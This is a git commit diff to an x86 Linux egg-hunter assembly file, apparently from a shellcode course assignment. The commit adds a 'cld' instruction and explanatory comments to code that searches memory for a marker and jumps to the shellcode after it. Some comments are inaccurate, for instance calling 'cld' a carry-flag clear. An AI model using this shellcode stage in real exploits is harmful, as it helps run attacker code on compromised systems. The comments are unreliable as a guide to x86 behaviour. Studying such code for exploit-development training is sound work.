cfc05175b5eebc162fcc6e15b3f9a47485cfa08f
GinVlad <minhthanhuit@gmail.com>
2016-05-28 00:54:45 +0700

    Add  instruction to make  alway working. Add some comment to explain code.

--- Assignment3/egg-hunters.asm
+++ Assignment3/egg-hunters.asm
@@ -5,21 +5,24 @@ global _start
 
 section .text
 _start:
+	cld 	; clear carry flag CF, to make scasd working
 	xor ecx, ecx
 allign_page:
-	or cx, 0xfff
+	; getconf PATE_SIZE == 4096. This is max size for 1 page segment. But 4096 in hex is NULL.
+	; SO the trick is create 4095 then +1
+	or cx, 0xfff	; 0xfff = 4095
 
 next_address:
-	inc ecx
+	inc ecx 		; 4095+1 = 4096. Page size
 	push byte +0x43 ;0x43 == 67. syscall sigaction
 	pop eax
 	int 0x80
 	cmp al, 0xf2	; Compare with EFAULTS
 	jz allign_page
 	mov eax, 0x50905090; egg key
-	mov edi, ecx
-	scasd 	; compare eax with edi+4
+	mov edi, ecx	; store ecx (address of page are looking egg) to edi
+	scasd 	; compare eax with edi+4. Find egg
 	jnz next_address	; !=0 return next_address
-	scasd
+	scasd 	;compare eax with edi+4+4. Find last 4 bytes egg
 	jnz next_address
 	jmp edi		; Jump to shellcode
